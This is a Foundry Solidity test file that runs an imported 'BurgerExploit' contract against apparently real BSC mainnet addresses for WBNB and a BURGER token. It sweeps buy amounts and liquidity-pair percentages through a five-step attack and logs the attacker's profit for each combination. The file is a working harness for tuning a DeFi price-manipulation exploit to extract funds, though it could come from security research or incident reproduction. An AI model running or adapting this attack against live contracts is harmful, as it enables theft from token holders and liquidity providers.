// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerExploit.sol";

contract BurgerTest5 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;
    address constant PLATFORM = 0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0;

    function test_sweep() public {
        // Test different buy amounts and pair ratios
        uint256[3] memory buyAmounts = [uint256(500 ether), uint256(1000 ether), uint256(2000 ether)];
        uint256[5] memory pairPcts = [uint256(1), uint256(2), uint256(5), uint256(10), uint256(20)];

        for (uint256 b = 0; b < buyAmounts.length; b++) {
            for (uint256 p = 0; p < pairPcts.length; p++) {
                _runAttack(buyAmounts[b], pairPcts[p]);
            }
        }
    }

    function _runAttack(uint256 buyAmount, uint256 pairPercent) internal {
        address attacker = makeAddr("attacker");
        uint256 startBnb = buyAmount + 500 ether;
        vm.deal(attacker, startBnb);
        vm.startPrank(attacker);

        BurgerExploit exploit = new BurgerExploit();
        exploit.step1_setup{value: buyAmount + 200 ether}();
        exploit.step2_buyBurger(buyAmount);

        uint256 burgerBal = IERC20(BURGER).balanceOf(address(exploit));
        uint256 burgerForPair = burgerBal * pairPercent / 100;
        if (burgerForPair < 1000) burgerForPair = 1000;

        exploit.step3_createPair(100 ether, burgerForPair);
        exploit.step4_attack(50 ether);
        exploit.step5_unwrap();

        int256 profit = int256(attacker.balance) - int256(startBnb);
        emit log_string(string.concat(
            "buy=", vm.toString(buyAmount / 1 ether),
            " pair%=", vm.toString(pairPercent),
            " profit=", vm.toString(profit / 1 ether),
            ".", vm.toString(uint256(profit > 0 ? profit : -profit) % 1 ether / 1e15)
        ));

        vm.stopPrank();
    }
}
